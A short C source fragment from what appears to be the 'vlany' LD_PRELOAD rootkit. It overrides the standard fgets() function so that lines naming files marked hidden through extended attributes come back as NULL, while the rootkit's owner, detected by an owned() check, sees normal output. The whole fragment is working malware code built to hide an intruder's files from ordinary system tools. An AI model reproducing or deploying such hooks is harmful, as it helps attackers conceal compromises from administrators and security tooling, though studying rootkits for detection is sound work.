char *fgets(char *s, int size, FILE *stream)
{
    #ifdef DEBUG
        printf("[vlany] fgets() called\n");
    #endif

    HOOK(old_fgets, CFGETS);

    if(owned()) return old_fgets(s, size, stream);

    char *p = old_fgets(s, size, stream);
    if(!p) return p;

    HOOK(old_access, CACCESS);
    if(old_access(s, F_OK) != -1)
    {
        // char pointer s is a file or a directory, check if it's hidden
        if(!hidden_xattr(s)) return p; // if char pointer s isn't hidden, continue as normal
        else return NULL; // if it's hidden..return NULL
    }

    // char pointer s is a regular string/isn't a file or directory
    return p;
}
